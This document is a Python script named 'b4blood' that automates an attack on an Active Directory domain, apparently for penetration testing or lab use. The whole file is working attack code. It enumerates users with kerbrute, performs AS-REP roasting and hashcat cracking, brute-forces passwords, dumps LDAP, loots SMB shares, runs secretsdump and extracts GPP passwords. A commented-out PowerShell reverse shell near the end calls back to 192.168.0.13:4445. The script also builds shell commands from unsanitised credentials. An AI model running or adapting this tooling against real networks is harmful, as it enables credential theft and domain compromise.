#!/usr/bin/python3

import time
from multiprocessing import Process
import sys
import os
import argparse
import subprocess
import re

red = "\033[0;31m"
green = "\033[0;32m"
yellow = "\033[0;33m"
blue = "\033[0;34m"
white = "\033[0;37m"

dumpDB=0
asrep=0
def printf(message,color):
		print("["+color+"*"+white+"]"+blue+message+white)

def nmap_thread(ip_to_scan):
	os.system(f"nmap {ip_to_scan} --top-ports 10000 -Pn -sCV -T4 > full_DC_nmap.txt  ")
	printf( " full Nmap scan finished",green)

def parse_arg():

	parser = argparse.ArgumentParser(description="b4blood 192.168.0.40, b4blood 192.168.0.0/24, b4blood --internal -i eth0")
	parser.add_argument("ip", help="Provide an IP or a range, 192.168.0.23, 192.168.8.*, 192.168.7.0/24")
	parser.add_argument("--internal", action="store_true", help="DHCP broadcast resquest, you must be physicaly on the network.")
	parser.add_argument("-U", help="Provide your own userlist to Kerbrute users. Default xato-net-10-million-usernames. b4blood 192.168.0.8 -U users.txt")
	parser.add_argument("-P", help="Provide your own passlist to Kerbrute users. Default rockyou.txt. b4blood 192.168.0.8 -P pass.txt, b4blood 192.168.0.8 -U users.txt -P pass.txt")
	parser.add_argument("-i", help="Interface for internal scan")
	args = parser.parse_args()	
	#print(args) 
	return args.ip, args.internal, args.U, args.P, args.i

def asrepHashCredExtract(hash):
    hash=hash.replace("\n","")
    return hash.split("$")[3].split("@")[0].replace(" ","")+":"+hash.split(":")[2].replace(" ","")

def kerbrute_bruteuser_cred_extract(ker):
	#print(ker)
	ker=ker.replace("\n","")
	ker=ker.replace("\x1b[32m","")
	ker=ker.replace("\x1b[0m","")
	ker=ker.split(" ")[7]
	return ker.split("@")[0].replace(" ","")+":"+ker.split(":")[1].replace(" ","")

def dumpLdapDB(cont, ip_to_scan, Domain_Name):
	print("")
	printf(" Dumping LDAP",green)
	if len(cont) > 1:
		for i, item in enumerate(cont):
			print(i+1, item.replace("\n",""))

		a=input(blue+f"Choose a cred: from 1 to {len(cont)}: "+white)
		cred=cont[int(a)-1].replace("\n","")				
	else:
		cred=cont[0]

	user=cred.split(":")[0]
	passw=cred.split(":")[1].replace("\n","")
	print()
	printf(f" Dumping AD with {user}:{passw} --> ldap_from{user}/	"+yellow+f"You should run after the complete scan: b4blood {ip_to_scan} -U users_from_{user}.txt",green)
	os.system(f'if [ ! -d "ldapdump_from_{user}" ];then mkdir ldapdump_from_{user}; fi')
	os.system(f'cd ldapdump_from_{user}; ldapdomaindump -u "{Domain_Name}\\{user}" -p {passw} {ip_to_scan} 2>/dev/null; cd ..')	

	if os.path.isfile(f'ldapdump_from_{user}/domain_users.grep'):
		dumpDB=1
		os.system(f'cat ldapdump_from_{user}/domain_users.grep | cut -f3 | grep -v name > users_from_{user}.txt')
		os.system(f'cat ldapdump_from_{user}/domain_users.grep | cut -f3,12 | grep -v name > users_from_{user}_description.txt')
		print()
		printf(" Could be interesting",green)
		with open(f'users_from_{user}_description.txt','r') as fichier:
			contenu=fichier.readlines()
		
		for item in contenu:
			item=item.split()
			if len(item) >1:
				print(white+f'{item[0]:<20}'+ yellow+" ".join(item).replace(item[0],""))
		print(white)
	else:
		printf(" LDAP dumping failed!",red)


banner ="""

  __ )   |  |    __ )   |       _ \    _ \   __ \  
  __ \   |  |    __ \   |      |   |  |   |  |   | 
  |   | ___ __|  |   |  |      |   |  |   |  |   | 
 ____/     _|   ____/  _____| \___/  \___/  ____/  

"""

print(red+banner+white)
print("Find Domain Controller on a network, enumerate users, AS-REP Roasting and hash cracking, bruteforce password, dump AD users, scan SMB shares")
print("2023 by Moloch\n")

ip,internal,U,P,interface = parse_arg()
ip_to_scan = ip

if ip_to_scan == None and internal==False:
	print("b4blood IP <OPTIONS>")
	print("b4blood -h       for help")
	exit()

if os.geteuid() != 0:
    printf(" You need to have root privileges to run this script.\n    Please try again, this time using 'sudo'. Exiting.",red)
    exit()


# forging dependencies
os.system('if [ ! -f "all_creds.txt" ];then touch "all_creds.txt"; fi')
os.system('if [ ! -d "libs" ];then mkdir libs; fi')
script="""
	#!/usr/bin/bash
	sudo nmap --script broadcast-dhcp-discover 2>/dev/null > nmap_disco_temp.txt
	chown $USER:$USER nmap_disco_temp.txt
	"""
with open ("libs/dhcp_query.sh","w") as fichier:
	fichier.write(script)
os.system("chmod +x libs/dhcp_query.sh")

script="""
	#!/usr/bin/bash
	sudo ntpdate $1
	"""
with open ("libs/ntp_sync.sh","w") as fichier:
	fichier.write(script)
os.system("chmod +x libs/ntp_sync.sh")


# script begins

if internal == True:
	if interface==None:
		printf(" Need an interface! sudo AD_exploit.py --internal -i eth0",red)
		exit()

	
	printf(" requesting DHCP",green)
	cmd='libs/dhcp_query.sh'	
	subprocess.call(cmd, shell=True)

	with open("nmap_disco_temp.txt","r") as fichier:
		contenu=fichier.read().split("Response")
	os.system("rm nmap_disco_temp.txt")
	inter_to_scan=""
	for i,item in enumerate(contenu):
		if interface in item:
			inter_to_scan = item

	if not inter_to_scan:
		printf( " interface not found !!!",red)	
		exit()
	
	with open("nmap_disco_iface.txt","w") as fichier:
		fichier.write(inter_to_scan)

	os.system('cat nmap_disco_iface.txt | grep "Server Identifier" | cut -d ":" -f2 > nmap_dhcp_discover.txt')
	os.system('cat nmap_disco_iface.txt | grep Domain | cut -d ":" -f2 >> nmap_dhcp_discover.txt')
	os.system("rm nmap_disco_iface.txt")

	with open("nmap_dhcp_discover.txt","r") as fichier:
		contenu=fichier.readlines()
	os.system("rm nmap_dhcp_discover.txt")

	primary_dns=""
	domain_name=""
	dhcp=""


	if len(contenu) >=1:
		dhcp = contenu[0].split(",")[0].replace(" ","")
		dhcp = dhcp.replace("\n","")
		printf(f" DHCP:	 {dhcp}",green)
	if len(contenu) >=2:
		primary_dns = contenu[1].split(",")[0].replace(" ","")
		primary_dns = primary_dns.replace("\n","")
		printf(f" primary DNS: {primary_dns}",green)
	if len(contenu) >=3:
		domain_name = contenu[2].replace(" ","")
		domain_name = domain_name.replace("\n","")
		#domain_name = domain_name.replace("\\x00","")
		printf(f" domain name: {domain_name}",green)

	if not any(x in primary_dns for x in ["192","172","10"]):
		printf(" primary DNS is not in the local network, try without --internal",red)
		exit()

	if domain_name !="":
		printf(" Resolving domain name",green)	
		os.system(f'dig @{primary_dns} {domain_name} +short  > domain_name_resolved.txt')
		with open("domain_name_resolved.txt") as fichier:
			contenu=fichier.readlines()
		os.system("rm domain_name_resolved.txt")

		if len(contenu) >1:
			printf(" error resolving domain name, adding DHCP and DNS to the hostslist to scan. May retry without --internal", red)

			os.system(f"echo {dhcp} > hostslist.txt")
			os.system(f"echo {primary_dns} >> hostslist.txt")

		if len(contenu) == 1:
			with open("domain_name_resolved","r") as fichier:
				contenu = fichier.read()
			printf(" resolving success: {domain_name} {contenu}")
			os.system("echo domain_name_resolved.txt > hostslist.txt")
	if not domain_name:
		printf(" no domain name, adding the primary DHCP and DNS to the hostslist to scan", red)
		os.system(f"echo {dhcp} > hostslist.txt")
		os.system(f"echo {primary_dns} >> hostslist.txt")

	os.system(f'nmap -p 88 -iL hostslist.txt -Pn -T4 | grep "open" -B5 | grep "Nmap scan report" | cut -d " " -f 5- | tee DC_list.txt')
	os.system("rm hostslist.txt")


else:
	if any(x in ip_to_scan for x in ["*","/"]):
		printf(f" scanning {ip_to_scan} for a Domain Controller, should take a while... --> DC_list.txt",green)
		os.system(f'nmap -p 88 {ip_to_scan} -Pn -T4 | grep "open" -B5 | grep "Nmap scan report" | cut -d " " -f 5- > DC_list.txt')
		with open("DC_list.txt","r") as fichier:
			contenu=fichier.readlines()
		if contenu !=0:
			printf(" Domain Controller found!",green)
	else:
		os.system(f'echo {ip} > DC_list.txt ')

with open("DC_list.txt","r") as fichier:
	contenu=fichier.readlines()

if not contenu:
	if ip_to_scan == None:
		ip_to_scan=""
	printf(f" No Domain Controller found on the network {ip_to_scan}", red)
	exit()

reg=re.compile("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")

if len(contenu) > 1:
	for i,item in enumerate(contenu):
		print(i+1,item.replace("\n",""))

	a=input(f"\033[0;33mChoose a DC: from 1 to {len(contenu)}: \033[0;37m")
	zob=contenu[int(a)-1].replace("\n","")
	zob=re.findall(reg,zob)[0]
	os.system(f'echo "{zob}" > DC.txt')
else:
	os.system('cat DC_list.txt > DC.txt')
	os.system("rm DC_list.txt")
with open("DC.txt","r") as fichier:
	contenu=fichier.readlines()
ip_to_scan = contenu[0].replace("\n","")
ip_to_scan=re.findall(reg,ip_to_scan)[0]


printf(f" scanning the Domain Controller {ip_to_scan}", green)

os.system(f'nmap {ip_to_scan} -p 3389 -sC -Pn > nmap_scan.txt')
os.system(f'cat nmap_scan.txt | grep DNS_Domain_Name | cut -d ":" -f2 >> DC.txt')
os.system("rm nmap_scan.txt")

with open('DC.txt', 'r') as fichier:
	contenu = fichier.readlines()
os.system("rm DC.txt")


if len(contenu) <=1:
	printf(f" No Domain Controller found on {ip_to_scan}", red)
	exit()

Domain_Name = contenu[1].replace("\n","")
Domain_Name = Domain_Name.replace(" ","")

print("")
printf(' '+green+f'DC {ip_to_scan} {Domain_Name}'+white,green )
printf(' NTP synchronizing with the DC for Kerberos',green)
cmd=f'libs/ntp_sync.sh {ip_to_scan}'
subprocess.call(cmd,shell=True)

if os.path.isfile("full_DC_nmap.txt"):
	with open("full_DC_nmap.txt","r") as fichier:
		contenu=fichier.readlines()
else:
	contenu=[]		
if len(contenu) <2:
	printf(" launching full Nmap scan on a thread --> full_DC_nmap.txt"+yellow+"	don't CTRL+C before the end of the scan! (about 3mn)"+white,green)
	thread=Process(target=nmap_thread, args=(ip_to_scan,))
	thread.start()


printf(' Looking for LDAP null bind',green)
a=Domain_Name.split(".")
b=""
for item in a:
	b=b+"DC="+f"{item}"+","
b=b[:-1]
os.system(f"ldapsearch -LLL -x -H ldap://{ip_to_scan} -b '{b}' 2>/dev/null | grep sn | cut -d' ' -f2 | tee ldapnull_users.txt")
with open("ldapnull_users.txt","r") as fichier:
	contenu=fichier.readlines()
if len(contenu) !=0:
	U = "ldapnull_users.txt"	
	#print("caca")
printf(f' KERBRUTING valid users, (CTRL+C) to end',green)

#print(U)
if U ==None:
	U="/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames_moloch.txt"

os.system(f"kerbrute userenum --dc={ip_to_scan} -d={Domain_Name} {U} |  tee kerbrutelog.txt | grep 'VALID'")

print("")
printf(' AS-REP Roasting valid users',green)
os.system('cat kerbrutelog.txt | grep VALID | cut -f2 | cut -d "@" -f1 | cut -d " " -f2 > valid_users.txt')
os.system("rm kerbrutelog.txt")
os.system(f'/opt/impacket/examples/GetNPUsers.py -no-pass -usersfile valid_users.txt -dc-ip {ip_to_scan} {Domain_Name}/ > GetNPUsers.log' )
os.system('cat GetNPUsers.log | grep krb5 > kerberhashs.txt')
os.system("rm GetNPUsers.log")
with open('kerberhashs.txt', 'r') as fichier:
	contenu = fichier.readlines()
if not contenu:

	printf(f" AS-REP Roasting failed !", red)
	os.system("rm kerberhashs.txt")
else:
	printf(" Hash(es) found!",green)
	asrep=1
	for hash in contenu:
		print(hash.replace("\n",""))
	if P ==None:
		P="/usr/share/wordlists/rockyou.txt"
	printf(f"Lauching {P} against the kbr5 hash(es), please wait... --> kbr5asrep_creds.txt",green)
	print(green)
	os.system(f'hashcat --quiet -m 18200 kerberhashs.txt {P} | tee kbr5asrep_creds.txt')    
	print(white)
	with open("kbr5asrep_creds.txt","r") as fichier:
		contenu=fichier.readlines()
	if not contenu:
		printf(" No kbr5 hash(es) cracked",red)
	else:
		with open("all_creds.txt","r+") as fichier2:
			contenu_all_creds=fichier2.readlines()
			#print(contenu_all_creds)
			#print(contenu)

			for item in contenu:
				#print(item)
				cred=asrepHashCredExtract(item)
				print(yellow+cred+white+"	(added to all_creds.txt)\n")
				#print(contenu_all_creds)
				if (cred+"\n") not in contenu_all_creds:	
					os.system(f"echo '{cred}' >> all_creds.txt")

contenu=[]
if os.path.isfile(f'all_creds.txt') and asrep:
	with open("all_creds.txt","r") as fichier:
		contenu=fichier.readlines()

#if len(contenu) !=0 and asrep:
#	dumpLdapDB(contenu, Domain_Name, ip_to_scan)

print("")
printf(" Bruteforcing passwords",green)
with open("valid_users.txt") as fichier:
	contenu=fichier.readlines()
for i,user in enumerate(contenu):
	print(i+1,user.replace("\n",""))
a=input(blue+f"Which user to bruteforce? 0=None: "+white)
if a!="0":
	user=contenu[int(a)-1].replace("\n","")
	print("")
	if P ==None:
		P="/usr/share/wordlists/rockyou.txt"
	printf(f" Lauching {P} against {user}@{Domain_Name}",green)
	os.system(f"kerbrute bruteuser --dc {ip_to_scan} -d {Domain_Name} {P} {user} -v | grep 'VALID' | tee kerbrute_{user}_tmp.txt")
	os.system(f"cat kerbrute_{user}_tmp.txt  | grep 'VALID' 2>/dev/null > creds_{user}.txt; rm kerbrute_{user}_tmp.txt ")
	#exit()
	with open(f"creds_{user}.txt","r") as fichier:
			contenu=fichier.readlines()
	if not contenu:
		print("")
		printf(" No password cracked",red)
		#exit()
	else:
		print("")
		with open("all_creds.txt","r+") as fichier2:
			contenu_all_creds=fichier2.readlines()
			#print(contenu_all_creds)
			#print(contenu)

			for item in contenu:
				cred=kerbrute_bruteuser_cred_extract(item)
				print(yellow+cred+white+"	(added to all_creds.txt)\n")
				#print(contenu_all_creds)
				if (cred+"\n") not in contenu_all_creds:	
					os.system(f"echo '{cred}' >> all_creds.txt")


contenu=[]
if os.path.isfile(f'all_creds.txt'):
	with open("all_creds.txt","r") as fichier:
		contenu=fichier.readlines()

if len(contenu) !=0:
	dumpLdapDB(contenu, ip_to_scan, Domain_Name)

if len(contenu) !=0:
	with open("full_DC_nmap.txt","r") as fichier2:
		contenu_nmap=fichier2.readlines()
	ssh=0
	smb=0
	winrm = 0
	for item in contenu_nmap:
		if "22/tcp" in item:
			ssh=1
		if "445/tcp" in item:
			smb=1
		if "5985" in item:
			winrm=1
	print()
	printf(" scanning SMB shares for passwords, DRSUAPI, remote access: --> smb_dump/", green)
	print("")
	for cred in contenu:
		user=cred.split(":")[0]
		passw=cred.split(":")[1].replace("\n","")
		print(green+f"{user}:{passw}"+white)
		if smb:
			os.system('if [ ! -d "smb_dump" ];then mkdir smb_dump; fi')
			os.system('if [ ! -d "shares" ];then mkdir shares; fi')

			os.system(f'smbmap -u {user} -p {passw} -d {Domain_Name} -H {ip_to_scan} | tee shares/smbshares_{user}.txt')
			print()
			os.system(f"cat shares/smbshares_{user}.txt | grep READ | cut -f2 > shares/shares_{user}.txt")
			with open(f"shares/shares_{user}.txt","r") as fichier3:
				shares=fichier3.readlines()
			os.chdir("smb_dump")
			extensions="txt,vbs,ps1,bat,exe,conf,xml,xslx".split(",")
			for share in shares:
				share=share.replace("\n","")
				for ext in extensions:
					cmd=f"recurse on; prompt off; mget *.{ext}"
					os.system(f'smbclient //{ip_to_scan}/{share} -U "{Domain_Name}\\{user}%{passw}" -c "{cmd}" > /dev/null')
			print()

			os.chdir("../")
			os.system(f'crackmapexec smb {ip_to_scan} -u {user} -p {passw}')
			os.system(f'python3 /opt/impacket/examples/secretsdump.py  {Domain_Name}/{user}:{passw}@{ip_to_scan}')

		if ssh:
			os.system(f'crackmapexec ssh {ip_to_scan} -u {user} -p {passw}')
		if winrm:
			os.system(f'crackmapexec winrm {ip_to_scan} -u {user} -p {passw}')
		print()
	
	if os.path.isdir("smb_dump"):
		os.chdir("smb_dump")

		for filename in os.listdir("./"):
			if ".xml" in filename:
				os.system(f"python /opt/impacket/examples/Get-GPPPassword.py -xmlfile '{filename}' 'LOCAL' " + " | grep 'Username\\|Password' | awk '{print $4}' > xml_cred.txt")
				with open("xml_cred.txt","r") as fichier:
					contenu=fichier.readlines()
				os.system("rm xml_cred.txt")
				if len(contenu)==2:
					u=contenu[0].replace("\n","")
					p=contenu[1].replace("\n","")
					cred=u+":"+p
					if cred !=":":
						printf(f" Found in smb_dump/{filename}:",green)
						print(yellow+cred+white+"	\t(Added to all_creds.txt)")

						os.chdir("../")
						with open("all_creds.txt","r+") as fichier2:
							contenu_all_creds=fichier2.readlines()
						if (cred+"\n") not in contenu_all_creds:	
							os.system(f"echo '{cred}' >> all_creds.txt")
						os.chdir("smb_dump")
	

		print()
		printf(" Could be interesting in smb_dump/",green)
		for filename in os.listdir("./"):
			print(yellow+filename+white)
		os.chdir("../")
		print()
	with open("all_creds.txt","r") as fichier:
		contenu=fichier.read()
	printf(" All creds:", green)
	print(yellow+contenu+white)
	
	#cmd='powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.13""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"'
	#os.system(f"smbmap -u {user} -p {passw} -d {Domain_Name} -H {ip_to_scan} -x '{cmd}'")



